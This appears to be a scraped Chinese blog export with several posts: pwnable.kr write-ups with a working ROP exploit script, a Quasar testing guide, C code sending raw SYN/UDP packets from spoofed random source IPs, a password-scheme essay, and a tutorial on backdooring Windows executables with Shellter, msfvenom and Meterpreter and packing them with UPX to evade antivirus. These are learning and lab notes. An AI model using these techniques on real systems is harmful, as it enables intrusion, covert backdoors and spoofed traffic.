&quot;3\\rG[S/%\\x1c\\x1d#0?\\rIS\\x0f\\x1c\\x1d\\x18;,4\\x1b\\x00\\x1bp;5\\x0b\\x1b\\x08\\x45+&quot;;void calc_flag(char* s){ int i; for(i=0; i&lt;strlen(s); i++){ flag[i] = s[i] ^ key[i]; } printf(&quot;%s\\n&quot;, flag);}int main(){ FILE* fp = fopen(&quot;/home/blukat/password&quot;, &quot;r&quot;); fgets(password, 100, fp); char buf[100]; printf(&quot;guess the password!\\n&quot;); fgets(buf, 128, stdin); if(!strcmp(password, buf)){ printf(&quot;congrats! here is your flag: &quot;); calc_flag(password); } else{ printf(&quot;wrong guess!\\n&quot;); exit(0); } return 0;} 这里就是要求输入password并和同目录的password文件比对，相同则输出 flag。直接cat password，显示无权限： 1cat: password: Permission denied 由于没有可利用的点并且分很低，结合提示可以想到不是常规思路能解决的题。注意到blukat.c这个程序明显是可以读password文件的，我们可以查看一下该文件的权限： 123456789$ ls -altotal 36drwxr-x--- 4 root blukat 4096 Aug 16 2018 .drwxr-xr-x 114 root root 4096 May 19 15:59 ..-r-xr-sr-x 1 root blukat_pwn 9144 Aug 8 2018 blukat-rw-r--r-- 1 root root 645 Aug 8 2018 blukat.cdr-xr-xr-x 2 root root 4096 Aug 16 2018 .irssi-rw-r----- 1 root blukat_pwn 33 Jan 6 2017 passworddrwxr-xr-x 2 root root 4096 Aug 16 2018 .pwntools-cache 需要是blukat_pwn组的用户才能够读，那么我们是以什么用户登录的呢？ 12$ iduid=1104(blukat) gid=1104(blukat) groups=1104(blukat),1105(blukat_pwn) 可以看到我们确实是属于blukat_pwn组的，但是却提示无权读取，那么只有一种可能，就是password文件本身的内容就是： 1cat: password: Permission denied 输入进程序就能得到 flag。 horcruxesIDA 一下ropme函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253int ropme(){ char s[100]; // [esp+4h] [ebp-74h] int v2; // [esp+68h] [ebp-10h] int fd; // [esp+6Ch] [ebp-Ch] printf(&quot;Select Menu:&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v2); getchar(); if ( v2 == a ) { A(); } else if ( v2 == b ) { B(); } else if ( v2 == c ) { C(); } else if ( v2 == d ) { D(); } else if ( v2 == e ) { E(); } else if ( v2 == f ) { F(); } else if ( v2 == g ) { G(); } else { printf(&quot;How many EXP did you earned? : &quot;); gets(s); if ( atoi(s) == sum ) { fd = open(&quot;flag&quot;, 0); s[read(fd, s, 0x64u)] = 0; puts(s); close(fd); exit(0); } puts(&quot;You'd better get more experience to kill Voldemort&quot;); } return 0;} 显然最后一个else部分的gets可以导致栈溢出，但是程序开启了 NX 使得无法在栈上执行shellcode，根据题目提示，这题我们需要利用 ROP 技术找到 7 个gadgets，最终劫持返回地址。 根据 IDA 提示，s位于ebp-0x74与返回地址相差0x74+0x4=0x78。注意到ropme函数的地址0x080a0009中含有0a这个截断字符，因此我们不可能将其中的地址写到栈上，也就是说不能绕过if ( atoi(s) == sum )直接去读 flag。那我们就需要找到sum： 123456789101112131415161718192021222324252627unsigned int init_ABCDEFG(){ int v0; // eax unsigned int result; // eax unsigned int buf; // [esp+8h] [ebp-10h] int fd; // [esp+Ch] [ebp-Ch] fd = open(&quot;/dev/urandom&quot;, 0); if ( read(fd, &amp;buf, 4u) != 4 ) { puts(&quot;/dev/urandom error&quot;); exit(0); } close(fd); srand(buf); a = -559038737 * rand() % 0xCAFEBABE; b = -559038737 * rand() % 0xCAFEBABE; c = -559038737 * rand() % 0xCAFEBABE; d = -559038737 * rand() % 0xCAFEBABE; e = -559038737 * rand() % 0xCAFEBABE; f = -559038737 * rand() % 0xCAFEBABE; v0 = rand(); g = -559038737 * v0 % 0xCAFEBABE; result = f + e + d + c + b + a + -559038737 * v0 % 0xCAFEBABE; sum = result; return result;} 由于调用了srand，我们无法预测abcdefg的值，但是我们又需要它们的值才能计算出sum。幸运的是，在ropme函数中刚才被我们忽略的上面的一大串if语句能带来一些帮助。当输入的v2等于这些随机数中的任一个时，就会执行相应的大写字母作为名字的函数，而这些函数会将随机数本身打印出来，这样我们就能拿到 7 个随机数的值了，相加就能得到sum。 我们从 IDA 中拿到 7 个函数的地址，前面先填充0x78字节，随后依次追加 7 个函数的地址，那么一个函数返回后就会返回到下一个函数的入口上，构成 ROP 链，最后再返回ropme计算sum。然而前面提到ropme地址无法写到栈上，但我们可以利用main函数中call ropme所在地址0x0809fffc，来返回到ropme。 因此，最终 payload 为： 12345678910111213141516171819202122from pwn import *p = remote('pwnable.kr', 9032)p.recvuntil(':')p.sendline('1')p.recvuntil(': ')payload = 'a'*0x78 + p32(0x0809fe4b) + p32(0x0809fe6a) + p32(0x0809fe89) + p32(0x0809fea8) + p32(0x0809fec7) + p32(0x0809fee6) + p32(0x0809ff05) + p32(0x0809fffc)p.sendline(payload)p.recvline()sum = 0for i in range(7): p.recvuntil('+') sum += int(p.recvline()[:-2]) # strip )\\np.recvuntil(':')p.sendline('1')p.recvuntil(': ')p.sendline(str(sum))print p.recv()","link":"/post/PwnkrToddler/"},{"title":"Quasar Testing 指南","text":"对 Quasar 文档测试部分 和 @quasar/testing 文档 部分内容进行了简单翻译，顺便记录了一些目前使用 Quasar 框架进行测试时存在的问题。 Quasar v1 项目可以通过 @quasar/testing 模块添加多种单元测试和 e2e 测试套件。实际上做的事情就是装一些 node 模块、生成一些配置文件、最后在 package.json 里加点脚本。理论上还可以结合 CI 使用，不过我还没试。 截止目前，@quasar/testing 尚未迁移到 Quasar v2。 @quasar/testing 实际上是 Quasar 框架的一个 App Extension，所以只能结合 Quasar CLI 使用（一般也不会用别的），并且只能通过 quasar ext add 命令来安装。 软件测试测试本身并不难，最困难的是搭测试的环境。测试的关键在于了解到底要测试什么。 测试功能（functionality），而不是函数（function）。 测试驱动开发能够让你写出更好的（以及更少的）测试。尽管这样看起来降低了效率，但长远来看能够极大减少项目中的 bug 和维护成本，就像买了必定赔付的保险一样。但并不是所有东西都值得被测试，或者值得在更高层面被测试。比如有些功能用 e2e 测试就好，不用单元测试。 安装可以装测试套件管理工具来管理所有安装的测试套件，也可以单独安装某个特定的测试套件。没有太大的区别，前者可能更方便点。 测试套件管理工具1$ quasar ext add @quasar/testing 安装时会让你选择要安装的测试套件，并且会提供 quasar test 命令方便跑测试，比如： 123456# Execute Jest tests$ quasar test --unit jest# Execute Cypress tests$ quasar test --e2e cypress# Execute Jest, Cypress and Security tests$ quasar test --unit jest --e2e cypress --security 这些命令的更底层的命令实际上写在了 quasar.testing.json 里，并且添加新套件之后这个配置文件也会更新。文件中的默认命令都可以在 CI 中使用。举个例子，如果装了 Jest 套件和 Cypress 套件，那配置文件就是这样的： 12345678910// quasar.testing.json{ &quot;e2e-cypress&quot;: { &quot;runnerCommand&quot;: &quot;yarn test:e2e:ci&quot; }, &quot;unit-jest&quot;: { &quot;runnerCommand&quot;: &quot;yarn test:unit:ci&quot; }} 注意这里调用了 package.json 脚本，后者的底层命令就是套件本身的命令，比如 jest --ci 等。 另外，开发不同的 mode 时可能需要变更传给 quasar dev 的参数，如果想在测试的时候也这样做，可以用 --dev 选项，比如： 12# Run jest &amp;&amp; dev server in pwa mode$ quasar test --unit jest --dev=&quot;-m pwa&quot; 单独安装以安装 Jest 套件为例： 1$ quasar ext add @quasar/testing-unit-jest 此时没有 quasar test 命令，但还是可以用 package.json 脚本和套件本身的命令。 移除要移除一个测试套件（例如 Jest），可以运行： 1$ quasar ext remove @quasar/testing-unit-jest 此时会删除相应的 node 模块，然后调用 Quasar 的 App Extension 卸载钩子。 重置不用移除，直接重新装一次： 1$ quasar ext add @quasar/testing-unit-jest 注意这样会覆盖掉所有相关文件，包括配置文件，记得备份。同时也会升级对应的 node 模块。如果不想升级 node 模块，可以运行： 1$ quasar ext invoke @quasar/testing-unit-jest 更新直接升级 node 模块就可以了： 1$ yarn add -D @quasar/quasar-app-extension-testing-unit-jest 这样不会影响现有的测试和配置文件。 更新大版本由于大版本更新可能改变配置文件，建议移除后重装一下： 12$ quasar ext remove @quasar/testing-unit-jest$ quasar ext add @quasar/testing-unit-jest 安装时选 Overwrite all，最后 git diff 一下看看改了哪些地方以及需要还原哪些地方。 问题@quasar/testing 是基于 Jest 26 和 @vue/test-utils 的，所以暂时不支持 Vue 3。编写测试时，首先需要用 mountQuasar 或者 mountFactory 提供一个 Quasar 框架的环境并挂载组件，然后在 options 参数中，指定组件需要用到的 Quasar 组件。比如测一个最简单的 404 页面： 123456789101112131415161718import { mountFactory } from '@quasar/quasar-app-extension-testing-unit-jest'import { QBtn } from 'quasar'import Error404 from 'pages/Error404.vue'const factory = mountFactory(Error404, { quasar: { components: { QBtn } }})describe('Error404', () =&gt; { test('shows correct info', () =&gt; { const wrapper = factory() const info = wrapper.get('[dt=&quot;info&quot;]') expect(info.text()).toContain('页面找不到了') })}) 需要注意的是，在测试使用 QPage 组件时，需要提供原本由上层 QLayout 提供的一些参数。这里可以用 qLayoutInjections 来实现： 12345678910111213import { mountFactory, qLayoutInjections} from '@quasar/quasar-app-extension-testing-unit-jest'import Login from 'pages/Login.vue'const factory = mountFactory(Login, { mount: { provide: qLayoutInjections(), // ... }, // ...}) 随后，对于一些 Vue 插件比如 VueRouter、Vuex 还有 VueCompositionApi 等等，可以通过 plugins 引入。前两者还需要在 mount 中指定给当前的 localVue（这种方式不需要 createLocalVue）。 123456789101112131415161718192021import { mountFactory, qLayoutInjections} from '@quasar/quasar-app-extension-testing-unit-jest'import VueCompositionApi from '@vue/composition-api'import VueRouter from 'vue-router'import Vuex from 'vuex'import Router from 'src/router'import Store from 'src/store'import Login from 'pages/Login.vue'const factory = mountFactory(Login, { plugins: [VueCompositionApi, VueRouter, Vuex], mount: { router: Router, store: Store, provide: qLayoutInjections(), // ... }, // ...}) 最后则是处理 @quasar/testing 的 一个 bug，将涉及到 Quasar Portal 的组件 mock 掉，否则会因为无法访问 Vue 实例上的 $q 而报 warning。 1234567891011121314151617181920212223242526272829303132333435import { mountFactory, qLayoutInjections} from '@quasar/quasar-app-extension-testing-unit-jest'import VueCompositionApi from '@vue/composition-api'import VueRouter from 'vue-router'import Vuex from 'vuex'import Router from 'src/router'import Store from 'src/store'import { // ..., Notify} from 'quasar'import Login from 'pages/Login.vue'Notify.create = jest.fn()const factory = mountFactory(Login, { plugins: [VueCompositionApi, VueRouter, Vuex], mount: { router: Router, store: Store, provide: qLayoutInjections(), mocks: { Notify } }, quasar: { components: { // ... } }})describe('Login', () =&gt; { // ...})","link":"/post/QuasarTest/"},{"title":"socket 编程发送 RAW 数据包","text":"实习的时候写的一小段代码。 要求是用 C/C++ 写发送 RAW 数据包的工具，需要支持 TCP 和 UDP。查了下资料发现比想象的要复杂，并且只发现了发送 ICMP RAW 数据包的样例，照着改了改。 大致需求 数据包以 RAW 方式发送 支持 TCP 和 UDP 协议 发送地址由使用者指定 源地址随机 发送消息内容随机 一些固定的部分头文件 raw.h 中存在一个固定的结构体和固定的函数： 123456789101112extern int errno;#pragma pack(1)typedef struct PACKET_RAW_HEADER { uint32_t dwIP; uint16_t uPort; PACKET_RAW_HEADER() : dwIP(0), uPort(0) {}} PacketRawHeader, * pPacketRawHeader;#pragma pack()int sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP); 之后的修改都必须基于这二者进行。 因此可以根据这些固定的部分先把主函数写好： 123456789101112131415161718#include &quot;raw.h&quot;int main(int argc, char *argv[]) { if (argc != 4) { printf(&quot;Usage: %s [ip] [port] [tcp|udp]\\n&quot;, argv[0]); exit(-1); } PacketRawHeader *pPacketRawHeader = new PacketRawHeader(); pPacketRawHeader-&gt;dwIP = inet_addr(argv[1]); pPacketRawHeader-&gt;uPort = htons(atoi(argv[2])); bool bTCP = true; if (!strcmp(argv[3], &quot;udp&quot;)) { bTCP = false; } printf(&quot;%s\\n&quot;, strerror(sendrawpacket(pPacketRawHeader, bTCP))); return 0;} 随后在主要需要修改的 sendrawpacket 函数中处理中断，关闭 socket： 12345678910111213int sockfd;int sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP){ signal (SIGINT, interrupt_handler); signal (SIGTERM, interrupt_handler);}void interrupt_handler (int signum) { close(sockfd); free(clientaddr); exit(0);} 主要逻辑创建 socket123456789int sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP){ //... if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; 0) { fprintf(stderr, &quot;Error creating socket:%s\\n&quot;, strerror(errno)); return errno; } //...} 根据要求，需要采用 SOCK_RAW + IPPROTO_RAW 的方式创建 socket。此时必须自己填充 IP 头部 以及 TCP/UDP 头部。 设置地址设置目标地址，该地址由命令行参数指定： 12345678910111213141516171819struct sockaddr_in* clientaddr = NULL;int sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP){ //... clientaddr = (struct sockaddr_in *)malloc(sizeof(struct sockaddr_in)); if (clientaddr == NULL) { fprintf(stderr, &quot;Error allocating memory:%s\\n&quot;, strerror(errno)); goto end; } clientaddr-&gt;sin_family = AF_INET; clientaddr-&gt;sin_port = pRawHeader-&gt;uPort; clientaddr-&gt;sin_addr.s_addr = pRawHeader-&gt;dwIP; //...end: close(sockfd); return errno;} 而源地址则由程序随机生成： 123456789101112131415161718192021int sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP){ char buffer[BUF_LEN] = {0}; char src_ip[20] = {0}; uint16_t src_port; char *string_data = NULL; size_t hdr_size = (bTCP ? (THDR_SZ) : (UHDR_SZ)); //... srand(time(NULL)); string_data = (char *) (buffer + IPHDR_SZ + hdr_size); for (int i = 0; i &lt; MSG_LEN; ++i) { string_data[i] = '0' + rand()%72; } string_data[MSG_LEN] = 0; printf(&quot;Message: %s\\n&quot;, string_data); sprintf(src_ip, &quot;%d.%d.%d.%d&quot;, rand()%256, rand()%256, rand()%256, rand()%256); src_port = rand()%65535 + 1; printf(&quot;Source IP: %s\\nSource Port: %d\\n&quot;, src_ip, src_port); //...} 其中定义的宏如下： 12345#define BUF_LEN 1024#define MSG_LEN 50#define IPHDR_SZ sizeof(struct iphdr)#define THDR_SZ sizeof(struct tcphdr)#define UHDR_SZ sizeof(struct udphdr) 这里用 buffer 存放完整的报文，string_data 存放消息，报文结构实际上是： 12345 ------------------------------------------| IP Header | TCP/UDP Header | string_data | ------------------------------------------ \\ / ---------------- buffer ----------------- 填充 IP 头部12345678910111213141516int sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP){ // ... struct iphdr *ip_hdr = (struct iphdr *)buffer; //... ip_hdr-&gt;ihl = 5; ip_hdr-&gt;version = 4; ip_hdr-&gt;tos = 0; ip_hdr-&gt;tot_len = IPHDR_SZ + hdr_size + strlen(string_data); ip_hdr-&gt;ttl = 64; ip_hdr-&gt;protocol = (bTCP ? IPPROTO_TCP : IPPROTO_UDP); ip_hdr-&gt;saddr = inet_addr(src_ip); ip_hdr-&gt;daddr = clientaddr-&gt;sin_addr.s_addr; ip_hdr-&gt;check = csum((unsigned short *)ip_hdr, ip_hdr-&gt;tot_len); //...} 这里需要对 IP 头部计算校验和，计算方法和之后 TCP / UDP 头部校验和计算方法相同，每 16 bit 进行反码求和： 1234567891011121314151617181920212223unsigned short csum(unsigned short *ptr, int nbytes) { register long sum; unsigned short oddbyte; register short answer; sum = 0; while (nbytes &gt; 1) { sum += *ptr++; nbytes -= 2; } if (nbytes == 1) { oddbyte = 0; *((u_char*)&amp;oddbyte) = *(u_char*)ptr; sum += oddbyte; } sum = (sum&gt;&gt;16) + (sum &amp; 0xffff); sum = sum + (sum&gt;&gt;16); answer = (short)~sum; return (answer);} 填充 TCP / UDP 头部12345678910111213141516171819int sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP){ // ... struct tcphdr *tcp_hdr = (struct tcphdr *)(buffer + IPHDR_SZ); struct udphdr *udp_hdr = (struct udphdr *)(buffer + IPHDR_SZ); //... if (bTCP) { tcp_hdr-&gt;source = htons(src_port); tcp_hdr-&gt;dest = clientaddr-&gt;sin_port; tcp_hdr-&gt;doff = 5; tcp_hdr-&gt;window = htons(200); tcp_hdr-&gt;syn = 1; } else { udp_hdr-&gt;source = htons(src_port); udp_hdr-&gt;dest = clientaddr-&gt;sin_port; udp_hdr-&gt;len = htons(8 + strlen(string_data)); } //...} 这里协议头部中使用了一些常用的参数值，使用 TCP 协议时发送 SYN 包。 填充 TCP / UDP 伪头部先定义伪头部结构体： 123456789struct pseudo_iphdr { uint32_t source_ip_addr; uint32_t dest_ip_addr; uint8_t fixed; uint8_t protocol; uint16_t len;};#define PHDR_SZ sizeof(struct pseudo_iphdr) 随后填充伪头部： 123456789101112int sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP){ // ... struct pseudo_iphdr csum_hdr; //... csum_hdr.source_ip_addr = ip_hdr-&gt;saddr; csum_hdr.dest_ip_addr = clientaddr-&gt;sin_addr.s_addr; csum_hdr.fixed = 0; csum_hdr.protocol = (bTCP ? IPPROTO_TCP : IPPROTO_UDP); csum_hdr.len = htons(hdr_size + strlen(string_data)); //...} 计算 TCP / UDP 校验和填充好伪头部后，便可以计算校验和了。首先将需要校验的部分放进 csum_buffer 中，也就是伪头部 + 头部 + 数据。随后用 csum 函数计算校验和并填入相应字段： 1234567891011121314151617181920212223242526272829303132int sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP){ // ... char *csum_buffer = NULL; size_t psize; //... psize = PHDR_SZ + hdr_size + strlen(string_data); csum_buffer = (char *)calloc(psize, sizeof(char)); if (csum_buffer == NULL) { fprintf(stderr, &quot;Error allocating memory:%s\\n&quot;, strerror(errno)); goto end1; } memcpy(csum_buffer, (char *)&amp;csum_hdr, PHDR_SZ); memcpy(csum_buffer + PHDR_SZ, udp_hdr, hdr_size + strlen(string_data)); if (bTCP) { tcp_hdr-&gt;check = csum((unsigned short *) csum_buffer, psize); } else { udp_hdr-&gt;check = csum((unsigned short *) csum_buffer, psize); } free (csum_buffer); csum_buffer = NULL; //...end1: free(clientaddr); clientaddr = NULL;end: close(sockfd); return errno;} 此时报文大概是这样： 1234567 ----------------------------------------------------| ... | Pseudo Header | TCP/UDP Header | string_data | ---------------------------------------------------- \\ / ---- IP Header ---- \\ / ---------------------- buffer --------------------- 发送数据包直接使用 sendto 指定地址为 clientaddr 即可。 1234567891011121314int sendrawpacket(PacketRawHeader* pRawHeader, bool bTCP){ //... if (sendto(sockfd, buffer, ip_hdr-&gt;tot_len, 0, (struct sockaddr *)clientaddr, sizeof(struct sockaddr_in)) &lt; 0) { fprintf(stderr, &quot;Error sending message:%s\\n&quot;, strerror(errno)); goto end1; }end1: free(clientaddr); clientaddr = NULL;end: close(sockfd); return errno;} 最后，可以使用 wireshark 进行测试，并打开校验和验证功能。","link":"/post/RawPacket/"},{"title":"粉碎字典：设计方便记忆的安全口令","text":"就算无法逃避社工，也要设法减少损失。 最近又心血来潮把所有重要账号的密码改了，在这个过程中产生了很多想法，记录一下。 常识我们知道，尽管扫码登录、手机验证码登录已经十分普及，传统的账号+密码依然是主流的登陆方式。为了避免和密码学术语混淆，这里说的“密码”实际上指的是“口令”。如今应该不会再有人用类似 123456 这样的口令了，然而在渗透过程中，我发现许多用户、乃至许多系统的口令依然只是做到了比 123456 强一些而已。因此，关于口令的设置，首先需要明确一些常识。 攻击站在攻击者角度，如果他想要窃取你的口令，一般会如何下手呢？最常见的方法不外乎暴力破解和字典攻击两种。 暴力破解如果攻击者已经知道你的口令是 6 位纯数字，那么他的思路就非常简单：从 000000 到 999999 逐一尝试直到成功为止；如果是 6 个字母组成的单词，那就枚举每一位上的 26（52）种可能性。只要时间够长，这种方法总能成功，然而问题在于当口令的长度和字符集增长时，暴力破解所需要的时间代价也飞速增长，使得这种方法在大部分场景下没有什么实用价值。为了缩小枚举的空间，攻击者常常选择另一种手段类似的方法：字典攻击。 字典攻击假设你的口令是上面说的 6 个字母组成的单词，攻击者可以靠查字典来大大缩小需要枚举的范围————毕竟，许多 6 字母组合并不能构成单词。当然，这么说是一种简化的情况。实际场景下的字典攻击，是攻击者先准备一本“口令字典”，然后只枚举在这本字典上出现过的那些口令。问题在于攻击者如何制定这本字典来提升成功率的。 这里就利用了人们为了方便记忆，总是使用与个人信息相关的口令这一现象。个人信息泄露在这个时代已经是家常便饭，因此通过一些信息收集手段，从某一个人的一个虚拟账号查到其真实身份及个人信息并非难事。这种手段被称为社会工程学，而被攻击者的口令很有可能就在由此定制出来的字典中。 防御那么作为防御者，我们需要考虑的也就是如何抵抗这两种攻击。抵抗暴力破解非常容易： 口令尽可能包含大写字母、小写字母、特殊符号、数字中的至少 3 种 口令长度不能太短，一般至少需要在 8 位以上 我们不妨称满足这两个条件的口令为爆破安全的。 然而字典攻击就没那么容易防了，因为安全是方便的敌人：与个人信息相关的口令容易记住，却也容易被字典攻击破解；与个人信息无关的、毫无规律的复杂口令很难被字典攻击破解，但却很难记。这一矛盾在撞库攻击下更为突出。 撞库攻击，即攻击者获取到某人在某一网站上的口令（明文）后，用同样的口令尝试登录同一人在其它网站上的账号的攻击手段。 这种攻击的存在提醒我们： 对于不同的网站账号应设置不同的口令，且每个口令都需要是爆破安全的 满足这样的安全性要求，可能会使一个人的口令非常难以记忆和管理。因此，许多人开始选择使用口令管理工具来存储和自动填充那些设置得十分复杂的口令。这是一种不错的办法，然而由于对一些口令管理工具安全性的担忧、以及在多个平台上装同一款软件的抵触，我依然倾向于依赖自己小小的灰色细胞。下面要介绍的，就是如何设计一套既便于记忆、又足够安全的口令方案。 需求在开始之前，先来看一下我们设计方案的需求： 对于任意两个不同的网站，方案产生的两个口令相同的概率是可忽略的 对于任意一个特定的网站，在没有纸笔、计算器等任何辅助工具的情况下，可以在较短时间内（例：10 秒内）得到完整的口令 所有产生的口令都是爆破安全的 实际上对于“可忽略”、“较短时间”都可以进行数学定义，这里就不赘述了。 方案设计以生于 1975 年 6 月 2 日的张三为例，我们如何为他设计一套口令方案呢？ 不可变部分从最简单易记的名字+生日方式（也是很多人在用的方式）开始，我们首先获得了基础口令： 1ZS19750602 这样的口令显然太弱了。我们可以对其应用适当的变换，例如用 k=6 的凯撒移位： 1`Y7?=;6&lt;68 具体应用哪种变换，取决于张三的脑洞、以及什么样的变换方式对张三来说比较容易计算。比如，他同样可以用一种规律比较杂的变换得到： 152I6_\\2O905 这里涉及到将字符垂直翻转、以及一些形状相近字符的互换等操作。这次生成的字符串和原字符串长度也不相同。 总之，通过将容易记忆的（与个人信息相关的）字符串进行一种容易计算的变换，我们可以轻松生成口令的不可变部分。 可变部分而可变部分取决于该口令所属的具体网站。以 QQ 为例，我们可以用类似qq/icq/imqq等作为网站的特征。随后对网站特征进行变换，例如qq可以变换为9g/11371/1wwa等（分别用了形似字替换、ASCII、键盘等规律进行变换）。这里需要注意的是对于同样的字符q应该变换出不同的结果，并且这里的变换方式不应与不可变部分的变换方式相同。 这样，通过提取网站特征并进行另一种容易计算的变换，我们得到了口令的可变部分。 那么张三最终的 QQ 口令就可以是：1wwa52I6_\\2O905。当然还可以加一些连接符，如1wwa&amp;52I6_\\2O905。 由于在上述步骤中，采用的变换、网站特征、原字符串都需要选取容易记忆的，我们可以确保该口令方案也是容易记忆的。问题是，这样的方案足够安全吗？ 安全性分析从密码学角度，这样的方案是不安全的，因为其核心就是Security through Obsecurity，这是违反 Kerckhoff 准则的。而且，这样的方案缺乏随机性，不可能是安全的。然而随机性恰恰是记忆的最大敌人，这使得我们不能在方案中引入随机性。 不过对于个人使用而言，可以认为该方案足够安全。在分析方案安全性之前，我们不妨先讨论一些安全的定义。 定义为了定义一种口令方案“有多安全”，我们可以站在攻击者的角度：攻击者为了获取口令所需要付出的代价越大，那么可以说这种口令方案越安全。不妨称攻击者为 A，被攻击者为 B，下面就给出一些攻击者具备不同能力时的场景： _弱社工攻击_：A 只能获取到关于 B 的一些基本社工信息，如姓名、生日、证件号码等，尝试获取 B 在随机某一网站上的口令 _强社工攻击_：A 有能力获取到任何与 B 有关的社工信息的每一个细节（A 比任何一个熟悉 B 的人更熟悉 B），尝试获取 B 在随机某一网站上的口令 _已知口令攻击_：上述基础上，A 有能力获取 B 在随机某一网站上的口令，尝试获取 B 在指定网站上的口令 _选择口令攻击_：上述基础上，A 有能力获取 B 在指定网站上的口令，尝试获取 B 新注册的网站上使用的口令 讨论可以看到，攻击者的能力是递增的。由于经过变换，口令看起来与社工信息无关，这足以保证口令不会出现在攻击者构造的字典中，使得强社工攻击难以成功；对于已知口令攻击和选择口令攻击，攻击者需要对获得的口令进行分析，以掌握口令方案中采用的两种变换、网站特征、原字符串————后两者不难猜解，而安全性的核心，即采用的两种变换如果选取得当，在已知口令攻击下是极难猜解的。这是因为已知口令情景下攻击者还需要区分可变和不可变的部分。 而对于选择口令攻击，攻击者可以很容易得到不可变的部分，那么最后的挑战就仅仅在于猜解两种变换。此时两种变换的设计就极大程度决定了方案的安全性。由于更安全几乎总是意味着更难以记忆，这里的设计可以根据个人需要来调整。如果使用类似凯撒移位这种变换，想要抵抗选择口令攻击是比较勉强的。 不过话说回来，选择口令攻击确实是极端的情景————因为此时攻击者必须要掌握你所有网站上的口令才行。现实中的撞库攻击一般更接近已知口令攻击，而我们的方案可以很好地抵御这类攻击情景。 总结我们可以这样设计既容易记忆、又能抵抗常规情景下字典攻击的口令方案：变换1(网站特征) || [连接符] || 变换2(可能与个人信息相关的字符串)；这种方案本质上是一种将可能与个人信息相关的字符串这类弱口令与网站特征关联从而生成动态强口令的方案。","link":"/post/ShredDict/"},{"title":"简单的 PE 后门","text":"记录一下最简单的挂后门和免杀方法，不怎么接触这块。 主要介绍两个工具：Shellter 和 Upx，后者 Kali 自带。Shellter 的安装略有点复杂，因为需要 wine32 的支持。使用的 Kali 是 64 位的。 首先apt install shellter应该不会有什么问题，但是启动的时候会提示缺少 wine32，因此执行： 1dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32 这一步会花费很长时间，因为 wine 本身很庞大。装完后应该就可以正常使用了。 通过 Shellter 篡改 exe 文件随意取一个 exe 文件作为我们要加入后门的可执行文件。首先启动 shellter，会看到： 输入A选择自动模式，随后输入 exe 文件所在路径，程序便会自动运行，分析原文件并插入恶意代码。这个过程大约持续不到一分钟。 输入Y开启隐蔽模式，随后选择使用它列出的七种 payload 还是自定义，这里我们输入L选择列出的 payload。 带Meterpreter前缀的是指可以通过 MSF 获取会话的 payload，方式有正向Bind与反向Reverse两种。Bind顾名思义，就是用户打开 exe 后，将会在用户主机上开放一个端口，攻击者去连接那个端口就可以获取会话。Reverse则是反过来，使用户主机连接攻击者开放的端口来获取会话。而带Shell前缀的 payload 可以直接反弹 shell 给攻击者。 攻击者还可以通过不同的协议来获取会话，比如任意 TCP 协议，HTTP/HTTPS 协议等。这里以选择 4 号 payloadMeterpreter_Bind_TCP为例。 最后要求设置LPORT也就是要在目标主机上打开的端口，只要是没有被占用的端口都可以，比如这里可以设置60000端口。 完成以后，新的 exe 文件就是已经被植入后门的 exe 文件，相比于原文件，它占空间多了一点，其它地方似乎看不出什么区别。 通过 Meterpreter 获取会话假设目标主机（Windows）获得了新的 exe 文件。在双击打开前，我们查看用netstat -an查看其已经开放的端口： 1234567891011121314Active Connections Proto Local Address Foreign Address State TCP 0.0.0.0:135 0.0.0.0:0 LISTENING TCP 0.0.0.0:445 0.0.0.0:0 LISTENING TCP 192.168.159.128:139 0.0.0.0:0 LISTENING TCP 192.168.159.128:1244 112.34.111.235:443 FIN_WAIT_2 UDP 0.0.0.0:445 *:* UDP 127.0.0.1:123 *:* UDP 127.0.0.1:1025 *:* UDP 127.0.0.1:1219 *:* UDP 192.168.159.128:123 *:* UDP 192.168.159.128:137 *:* UDP 192.168.159.128:138 *:* 然后我们双击打开，发现和原来的 exe 完全没有区别。再次查看端口情况可以发现，60000端口悄悄开启了： 123456789101112131415Active Connections Proto Local Address Foreign Address State TCP 0.0.0.0:135 0.0.0.0:0 LISTENING TCP 0.0.0.0:445 0.0.0.0:0 LISTENING TCP 0.0.0.0:60000 0.0.0.0:0 LISTENING TCP 192.168.159.128:139 0.0.0.0:0 LISTENING TCP 192.168.159.128:1244 112.34.111.235:443 FIN_WAIT_2 UDP 0.0.0.0:445 *:* UDP 127.0.0.1:123 *:* UDP 127.0.0.1:1025 *:* UDP 127.0.0.1:1219 *:* UDP 192.168.159.128:123 *:* UDP 192.168.159.128:137 *:* UDP 192.168.159.128:138 *:* 接下来我们看看攻击者要怎么操作来获取会话。 首先要确保攻击者和目标主机在同一网段。打开msfconsole。依次输入： 12345use exploit/multi/handlerset payload windows/meterpreter/bind_tcpset lport 60000set rhost 192.168.159.128exploit 其中rhost需要改为目标主机的内网 IP。 这样以后，就可以获取会话，并执行任意命令了（会话的作用不局限于执行 shell 命令）： 需要注意的是，一旦用户关闭 exe 文件，会话也将随之关闭。因此实际场景中常常配合持久化提权工具使用。 使用 msfvenom 直接生成带后门的 PE 文件上面的例子需要修改一个已有的 exe 文件，这里我们可以直接生成这样的带后门的文件： 1msfvenom -p windows/meterpreter/bind_tcp lport=60001 -f exe &gt; test.exe 端口号依然可以是任意未被占用的端口。msfvenom 也提供了许多选项实现免杀，这里不一一介绍了。 使用 Upx 给程序加壳这样做的作用主要有两个：压缩文件大小和免杀。然而 Upx 加壳毕竟是最最简单的免杀方法，现在的绝大多数杀毒软件都能轻易脱壳。举个例子，给刚才生成的 exe 文件加壳，只需要： 1upx -9 test.exe -1参数压缩得最快，-9参数压缩得最好。 后记这篇文章叙述的方法是最初级的植入后门的方法，略过了很多有一定难度的细节，详情参见 Shellter/Upx/msfvenom 的文档。","link":"/post/ShellterNUpx/"},{"title":"简单 DFS 题合集","text":"题目全部来自EOJ。新年开始用C++了。 1012 The 3n+1 Problem 